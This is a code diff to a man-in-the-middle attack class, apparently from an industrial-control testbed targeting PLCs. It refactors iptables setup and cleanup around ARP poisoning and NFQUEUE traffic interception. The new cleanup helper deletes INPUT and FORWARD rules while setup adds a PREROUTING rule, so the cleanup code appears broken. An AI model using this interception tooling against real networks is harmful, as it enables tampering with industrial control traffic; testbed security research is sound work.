@@ -33,6 +33,15 @@ class MiTMAttack(SyncedAttack):
         # Process object to handle nfqueue
         self.nfqueue_process = None
 
+    def clear_ip_tables(self):
+
+        os.system(f'iptables -t mangle -D INPUT -p tcp -j NFQUEUE --queue-num 1')
+        os.system(f'iptables -t mangle -D FORWARD -p tcp -j NFQUEUE --queue-num 1')
+
+        os.system('iptables -D FORWARD -p icmp -j DROP')
+        os.system('iptables -D INPUT -p icmp -j DROP')
+        os.system('iptables -D OUTPUT -p icmp -j DROP')
+
     def setup(self):
         """
         This function start the network attack.
@@ -58,6 +67,9 @@ class MiTMAttack(SyncedAttack):
             self.logger.error('Wrong direction configured, direction must be source or destination')
             raise DirectionError('Wrong direction configured')
         """
+
+        self.clear_ip_tables()
+
         os.system(f'iptables -t mangle -A PREROUTING -p tcp -j NFQUEUE --queue-num 1')
 
         os.system('iptables -A FORWARD -p icmp -j DROP')
@@ -71,7 +83,7 @@ class MiTMAttack(SyncedAttack):
                 if plc['name'] != self.intermediate_plc['name']:
                     launch_arp_poison(self.target_plc_ip, plc['local_ip'])
 
-        self.logger.debug(f"Naive MITM Attack ARP Poison between {self.target_plc_ip} and "
+        self.logger.debug(f"MITM Attack ARP Poison between {self.target_plc_ip} and "
                           f"{self.intermediate_attack['gateway_ip']}")
 
         queue_number = 1
@@ -101,24 +113,10 @@ class MiTMAttack(SyncedAttack):
                 if plc['name'] != self.intermediate_plc['name']:
                     restore_arp(self.target_plc_ip, plc['local_ip'])
 
-        self.logger.debug(f"Naive MITM Attack ARP Restore between {self.target_plc_ip} and "
+        self.logger.debug(f"MITM Attack ARP Restore between {self.target_plc_ip} and "
                           f"{self.intermediate_attack['gateway_ip']}")
 
-        """"
-        if self.direction == 'source':
-            os.system(f'iptables -t mangle -D PREROUTING -p tcp --sport 44818 -s {self.target_plc_ip} -j NFQUEUE '
-                      f'--queue-num 1')
-        elif self.direction == 'destination':
-            os.system(f'iptables -t mangle -D PREROUTING -p tcp --sport 44818 -d {self.target_plc_ip} -j NFQUEUE '
-                      f'--queue-num 1 ')
-        """
-
-        os.system(f'iptables -t mangle -D PREROUTING -p tcp -j NFQUEUE --queue-num 1')
-
-        os.system('iptables -D FORWARD -p icmp -j DROP')
-        os.system('iptables -D INPUT -p icmp -j DROP')
-        os.system('iptables -D OUTPUT -p icmp -j DROP')
-
+        self.clear_ip_tables()
         self.logger.debug(f"Restored ARP")
 
         self.logger.debug("Stopping nfqueue subprocess...")
